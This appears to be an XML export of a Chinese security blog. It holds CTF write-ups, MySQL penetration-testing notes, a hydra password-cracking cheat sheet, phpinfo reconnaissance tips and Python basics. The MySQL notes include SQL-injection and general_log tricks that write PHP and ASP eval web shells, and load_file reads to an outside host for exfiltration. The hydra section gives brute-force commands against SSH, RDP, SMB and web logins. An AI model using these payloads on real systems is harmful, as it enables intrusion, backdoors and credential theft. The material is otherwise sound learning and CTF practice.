PEN_AND_APPLE（分数：150）(√已完成)狗师傅平日里比较害羞，但是又想追女神，于是他隐藏了一段信息在这段自拍中，这句话是他最想对女神说的话:) 你能找到信息，并帮助狗师傅表白成功么:) 视屏在这儿:)https://pan.baidu.com/s/1slu5Vwp 解法：下载下来发现是ppap，最近很火的。这道题还是等到了官方给出提示之后才做的。提示：该题目与Windows下的type命令有关 , 而且文件为rar格式压缩也印证了这一点 , 因此想到可能是NTFS流文件 , 直接使用工具(NTFS Stream Info)进行提取 , 注意在解压压缩包的时候要使用winrar , 因为只有winrar才支持保留ntfs流文件 , 解压后使用工具进行扫描提取 , 得到一张图片 , 图片中的内容即为flag 藏着小秘密的流量包（分数：200）http://pan.baidu.com/s/1cwwdVC有一天皓宝宝没了流量只好手机来共享，顺便又从手机发了点小秘密到电脑，你能找到它吗？ 解法：因为文件太大，所以怀疑。参照http://blog.sina.com.cn/s/blog_ab9229c10102wp0n.htmlflag:SYC{this_is_bluetooth Linux1、linux_1(score:150)这是一个docker镜像文件，答案就隐藏在深处的一个文件中，你能找到它吗？链接: https://pan.baidu.com/s/1hsjYDqk 密码: a1ux2、linux-2(score:150)接着找呀，还有一个flag文件3、继续继续,听说有一个用户的密码是syc和一个生日组合的(年月日格式)，请帮忙找回它，最后flag为：SYC{用户密码} 解法：由于这三道都是同个docker镜像文件，所以统一写，如果没接触过docker就去这里看看它的基本命令。首先将tar文件拷贝到另外的一个docker daemon上，就可以直接通过docker load来加载镜像，之后直接 sudo docker load -i geek_linux.tar这样就可以将geek_linux.tar文件中所包含的镜像导入，加载成image的形式，之后再docker image -a就可以发现.然后就每个文件都看一下。1.发现在/usr/local/etc/发现了geek文件夹，ls无果，有可能是隐藏的文件，用find -name “.*”，发现有个.flag打开就有flag。2.在翻目录的时候在/root/下发现了F1Ag2.swp，这个是vim异常退出而产生的文件，vim -r F1Ag2.swp恢复，然后打开得到flag。3.因为是用户密码，而用户密码凭据在shadow文件中，所以我们将shadow文件复制下来，用john进行破解，在弄的时候，手上的Ubuntu抽风了。生成字典：123456789101112131415#!/usr/bin/python# -*- coding: &lt;utf-8&gt; -*-for year in range(1970,2016) : for month in range(13) : if month &lt; 10 : month_str = &quot;0&quot; + str(month) else : month_str = str(month) for day in range(32): if day &lt; 10 : day_str = &quot;0&quot; + str(day) else : day_str = str(day) password = &quot;SYC&quot; + str(year) + month_str + day_str print password 由于开始我没有考虑单数的问题，所以。。。。参考了一航同学的才想起来flag1：SYC{L1Nux_1s_Fun_F0r_uS}flag2：SYC{40ac6ed53f18a051}flag3：SYC{syc19770308} Programcompress300(score:250)是master go就解压300层 http://down.sycsec.com/programme/300 解法：利用Python中的tarfile,zipfile12345678910111213141516#!/usr/bin/python# -*- coding:utf-8 -*-import zipfileimport tarfilefor i in range(1, 301)[::-1]: path = &quot;/root/rcoil/&quot; + str(i) try: tar = tarfile.open(path) tar.extractall(&quot;/root/rcoil/&quot;) except: pass try: zip = zipfile.ZipFile(path) zip.extractall(&quot;/root/rcoil/&quot;) except: pass 刚开始不知道是几个格式。flag：SYC{c0Mp4esS_666_3o_O} 单身二十年，手速一定快(score:200)http://web.sycsec.com/0b3a7c6ca7f1f2e6/ 狗师傅说这道题要跑跑脚本呢:) 跑出后找qq:3245037532 推荐一下python学习链接啦:)http://pan.baidu.com/s/1hsdTlgo 解法：Isron同学的脚本借鉴123456789import requestss=requests.session()url=&apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/&apos;url2=&apos;http://web.sycsec.com/0b3a7c6ca7f1f2e6/judge.php&apos;qqq=s.get(url).content #通过requests获取到网页源代码a = qqq.count(&apos;@&apos;)-1 #利用count计数器获取@值post = &#123;&apos;mytext&apos;:a&#125; #构造post数据q = s.post(url2,data=post) #上传post数据到url2print q.content.decode(&apos;utf-8&apos;) #输出返回值 flag：SYC{web_is_fun}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL问题]]></title>
    <url>%2F2016%2F09%2FMySQL%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[渗透测试中遇到一些MySQL问题 常用操作语句用户管理 新建用户： CREATE USER name IDENTIFIED BY ‘ssapdrow’; 更改密码： SET PASSWORD FOR name=PASSWORD(‘fdddfd’); 权限管理 SHOW GRANTS FOR name; //查看name用户权限GRANT SELECT ON db_name. TO name; //给name用户db_name数据库的所有权限REVOKE SELECT ON db_name. TO name; //GRANT的反操作，去除权限； 数据库操作 查看数据库： SHOW DATABASES; 创建数据库： CREATE DATABASE db_name; //db_name为数据库名 使用数据库： USE db_name; 删除数据库： DROP DATABASE db_name; 创建表 创建表：1234567CREATE TABLE table_name(id TINYINT UNSIGNED NOT NULL AUTO_INCREMENT, //id值，无符号、非空、递增——唯一性，可做主键。name VARCHAR(60) NOT NULLscore TINYINT UNSIGNED NOT NULL DEFAULT 0, //设置默认列值PRIMARY KEY(id))ENGINE=InnoDB //设置表的存储引擎，一般常用InnoDB和MyISAM；InnoDB可靠，支持事务；MyISAM高效不支持全文检索DEFAULT charset=utf8; //设置默认的编码，防止数据库中文乱码 如果有条件的创建数据表还可以使用 &gt;CREATE TABLE IF NOT EXISTS tb_name(…….. 复制表： CREATE TABLE tb_name2 SELECT * FROM tb_name;或者部分复制：CREATE TABLE tb_name2 SELECT id,name FROM tb_name; 创建临时表： CREATE TEMPORARY TABLE tb_name(这里和创建普通表一样); 查看数据库中可用的表： SHOW TABLES; 查看表的结构： DESCRIBE tb_name;也可以使用：SHOW COLUMNS in tb_name; //from也可以 删除表： DROP [ TEMPORARY ] TABLE [ IF EXISTS ] tb_name[ ,tb_name2…….];实例：DROP TABLE IF EXISTS tb_name; 表重命名： RENAME TABLE name_old TO name_new;还可以使用：ALTER TABLE name_old RENAME name_new; 插入数据 插入数据： INSERT INTO tb_name(id,name,score)VALUES(NULL,’张三’,140),(NULL,’张四’,178),(NULL,’张五’,134);这里的插入多条数据直接在后边加上逗号，直接写入插入的数据即可；主键id是自增的列，可以不用写。 插入检索出来的数据： INSERT INTO tb_name(name,score) SELECT name,score FROM tb_name2; 更新数据 指定更新数据： UPDATE tb_name SET score=189 WHERE id=2;UPDATE tablename SET columnName=NewValue [ WHERE condition ] 更新数据 指定更新数据： UPDATE tb_name SET score=189 WHERE id=2;UPDATE tablename SET columnName=NewValue [ WHERE condition ] MySQL外连 改表 vps上的MySQL不允许远程登陆，只能在127.0.0.1。这个时候只要在vps上，登入MySQL后，更改 MySQL数据库里的 user表里的 host 项，从localhost改称% 或添加一个用户为%。1234mysql -u root -pmysql&gt;use mysql;mysql&gt;update user set host = &apos;%&apos; where user = &apos;root&apos;;mysql&gt;select host, user from user; 授权 在MySQL服务器上MySQL命令行执行以下命令：12grant all privileges on *.* to root@&quot;%&quot; identified by &apos;rcoil&apos; with grant option; flush privileges; 其中上面两行代码的意思是给从任意ip地址连接的用户名为root，密码为abc的用户赋予所有的权限。其中的”%”为任意的ip地址，如果想设为特定的值也可以设定为特定的值。 利用 Navicat 自带的http隧道链接 我这里是本地做的测试。 就可以链接了。方便你我他。 MySQL数据截断问题之前在做ISCC的最后一道Web题上遇到的问题，但是一直忘了记录下来。 对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。先判断注册时的username与数据库里已存在的username是否数据重复，如果出现重复，我们可以用数据的超长截断来绕过这些判断，从而导致更新密码的作用（一个username多个passwd）。 原理： 比如一个表的结构是这样的：1create table admin(username varchar(10) not null,passwd varchar(10) not null); 可以看到username跟passwd的字节为10 但是这my.ini设置成sql-mode=”NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”的话就算超出也会添加成功 mysql的 sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示 warning，而不是error，这样可能会导致一些截断问题。 123456789mysql&gt; insert into RcoIl(`username`,`passwd`) values(&quot;admin x&quot;, &quot;111&quot;)mysql&gt; select * from RcoIl;+----+-----------------+--------------+| id | username | passwd |+----+-----------------+--------------+| 1 | admin | 11 || 2 | admin | 111 |+----+-----------------+--------------+ 出现了两个admin的记录。 从而我们可以用另外的密码去登录admin账户 MySQL的读写 读文件 常见的读文件，可以用16进制代替字符串1234selectload_file(&apos;c:/boot.ini&apos;)selectload_file(0x633a2f626f6f742e696e69)selectload_file(&apos;//ecma.io/1.txt&apos;) # smb协议selectload_file(&apos;\\\\ecma.io\\1.txt&apos;) # 可用于DNS隧道 写文件已知唯一的写文件的方式 1select 0x313233 intooutfile &apos;D:/1.txt&apos; root权限写shell方法 union 1id=2) union select 1,2,3,4,5,6,7,&apos;&lt;? phpinfo(); ?&gt;’ into outfile ‘/home/wwwroot/lu4n.com/luan_phpinfo.php’# no union 1id=2) into outfile ‘/home/wwwroot/demo/phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’# 无outfile权限时写shell方法outfile被禁止，或者写入文件被拦截，root权限，在数据库中操作如下:1234show variables like &apos;%general%&apos;; // 查看mysql日志路径set global general_log=on; //开启日志set global general_log_file=&apos;xxx路径/1.php&apos;; //设置目录日志为shell地址select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; //随意执行一条mysql语句让其写入一句话到1.php文件里 os-shell查找绝对路径及写入前端随便查看某图片名字或者上传查看路径linux系统： 使用pwd查看当前路径逐层使用ls查找（如uploads）路径写入一句话os-shell&gt;echo \&lt;\php\ \@eval\(\$\_POST\[rcoil\]\)\;\?\&gt; &gt;/uploads/rcoil.php tips：当无法执行命令或者权限低时，可以使用/sbin/如：##/sbin/ifconfig windows系统： 在前端找到一张图片，查看图片名：rcoil.jpg使用dir /s /b d:\rcoil.jpg,就能查找rcoil.jpg的路径写入一句话os-shell&gt;echo ^&lt;%eval request(chr(123))%^&gt; &gt;&gt;d:\web\1.txt 当路径为中文名，没找到好方法。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hydra 爆破]]></title>
    <url>%2F2016%2F09%2Fhydra-%E7%88%86%E7%A0%B4%2F</url>
    <content type="text"><![CDATA[本文是笔者的学习的笔记，在于记录自己在学习过程中的知识积累，以便以后查找方便。 说明：1234567891011121314-R 根据上一次进度继续破解-S 使用SSL协议连接-s 指定端口-l 指定用户名-L 指定用户名字典(文件)-p 指定密码破解-P 指定密码字典(文件)-e 空密码探测和指定用户密码探测(ns)-C 用户名可以用:分割(username:password)可以代替-l username -p password-o 输出文件-t 指定多线程数量，默认为16个线程-vV 显示详细过程server 目标IPservice 指定服务名(telnet ftp pop3 mssql mysql ssh ssh2......) 使用案例：123456789101112131415161718192021222324252627使用hydra破解ssh的密码hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh 破解https：# hydra -m /index.php -l username -P pass.txt IP https 破解teamspeak：# hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 破解cisco：# hydra -P pass.txt IP cisco# hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable破解smb：# hydra -l administrator -P pass.txt IP smb破解pop3：# hydra -l muts -P pass.txt my.pop3.mail pop3破解rdp：# hydra IP rdp -l administrator -P pass.txt -V破解http-proxy：# hydra -l admin -P pass.txt http-proxy://10.36.16.18 破解telnet# hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V 破解ftp：# hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV# hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV 登录破解12345678910111213get方式提交，破解web登录： # hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/ # hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.phppost方式提交，破解web登录： 该软件的强大之处就在于支持多种协议的破解，同样也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具有一个不好的地方就是，如果目标网站登录时候需要验证码就无法破解了。带参数破解如下：&amp;lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;name&quot; /&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;password&quot; name=&quot;pwd&quot; /&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;submit&quot; name=&quot;sub&quot; value=&quot;提交&quot;&amp;gt;&amp;lt;/form&amp;gt; 假设有以上一个密码登录表单，我们执行命令：# hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&amp;amp;pwd=^PASS^:&amp;lt;title&amp;gt;invalido&amp;lt;/title&amp;gt;” 说明：破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t 是同时线程数为1，-f 是当破解了一个密码就停止，ip 是本地，就是目标ip，http-post-form表示破解是采用http 的post 方式提交的表单密码破解。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从phpinfo获取信息]]></title>
    <url>%2F2016%2F09%2F%E4%BB%8Ephpinfo%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF%2F</url>
    <content type="text"><![CDATA[phpinfo()是为显示php服务器的配置信息。 用户可以查看到php的版本 绝对路径(_SERVER[“SCRIPT_FILENAME”])找到phpinfo()页面可以直接找到网站的绝对路径，对于写shell和信息搜集是必不可少的。 泄漏ip（_SERVER[“SERVER_ADDR”]或SERVER_ADDR） 支持的程序可以通过phpinfo()查看一些特殊的程序服务，比如redis、memcache、mysql、SMTP、curl等等如果服务器装了redis或者memcache可以通过ssrf来getshell了，在discuz中都出现过此类问题。如果确定装了redis或memcache的话，在没有思路的情况下，可以着重找一下ssrf GOPHER也算是ssrf一部分吧，或者说主要靠ssrf利用起来，如果支持gopher，ssrf便没有压力咯 一些敏感配置allow_url_include、allow_url_fopen、disable_functions、open_basedir、short_open_tag等等 比如allow_url_include可用来远程文件包含、disable_functions用来查看禁用函数，绕过执行、查看是否开启open_basedir，用p牛的绕过open_basedir的方法有可能能读一些没权限的目录等等]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python文件读写]]></title>
    <url>%2F2016%2F09%2FPython%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%2F</url>
    <content type="text"><![CDATA[在Python中, 文件读写不需要import任何库, 第一步是使用open函数获取一个文件对象 Open()函数我们使用内置的open()函数打开一个文件. open()返回一个文件对象, 一般会传入两个参数。 语法1file_object = open(filename, mode) # file_object是储存文件对象的变量 mode参数是可以省略的, 缺省条件下为’r’mode参数可以是: r – 读文件w – 仅写文件(如果有同名文件会被覆盖)a – 添加文本; 所有写入的内容都会被自动添加到文件末尾r+ – 读写文件常用两个函数是read和write。 创建文本文件123file = open(&quot;demo.txt&quot;, &quot;w&quot;)file.write(&quot;this is demofile\n&quot;)file.close() 读取文本文件file.read()函数如果想得到文件中所有字符的字符串，直接使用file.read()如果想得到指定字符串长度，那就使用file.read(n) file.readline()函数使用readline()函数会逐行读取文件，调用readline()会获取文件第一行, 之后的调用会返回接下来的行。readlines()将整个文件作为一个用\n分隔的列表返回。 循环遍历一个文件对象读取文件的行时, 你可以循环遍历这个文件对象。 这在内存占用上是高效的, 并且写法简单. close()函数当你对文件的操作结束后, 调用f.close()来关闭它并且释放打开这个文件所占用的系统资源。 调用f.close()后, 对这个文件的操作都会失败. 判断目录是否可读可写1234567891011121314151617#!/usr/bin/env python2.7#-*- coding: UTF-8 -*- import osimport sysdef dirFile(dirPath): for dirpath,dirnames,filenames in os.walk(dirPath): for dirname in dirnames: dirfile = os.path.join(dirpath, dirname) if os.access(dirfile, os.R_OK) and os.access(dirfile, os.W_OK): print "文件可读可写:",dirfile elif os.access(dirfile, os.R_OK) and not os.access(dirfile, os.W_OK): print "文件可读不可写:",dirfileif __name__ == '__main__': filePath = 'c:\\phpstudy\\www\\' dirFile(filePath)]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天融信杯决赛]]></title>
    <url>%2F2016%2F09%2F%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E5%86%B3%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[图是丑了点，图中也有错的地方，就不要在意了。(比赛时间是2016年7月23-24号) 一进门，一扫，人手一台kali虚拟机，受不了。 四台堡垒机 刚开始拓扑图都还没看懂，表哥们都已经开始攻击了。 开始物理机IP正确但是连不上，虚拟机的window系统也连不上。 只有Linux能连上去，加上不是平时自己用的电脑，心态爆炸。 想用小伙伴的电脑，发现没配环境。 ssh连后两台堡垒机，发现了administrator目录，打开一看是joomla的，猜测会存在java反序列化漏洞。 但是手上的电脑只有别的反序列化脚本，唯独缺了joomla的脚本，所以检测不了。 就在这时，duang的一声，组委会的人站了出来说话，说有hint。 看了下，第一台必须要用弱口令才能登录，第二台绕过登录。 后两台还真是有反序列化。 所以就开始掏手机找hackUtils脚本了。 直到了吃饭时间，在吃饭的时候讨论了一下，发现小伙伴是有这脚本的。 回来现场，重启了电脑，重新配置ip，发现是和之前的不一样的，网关变了（怪不得之前一直连不上） 脚本有了，但是我一直用错命令。 所以很可惜、 最后拿了个三等奖。 第一台堡垒机的writeup:Fire-ant]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>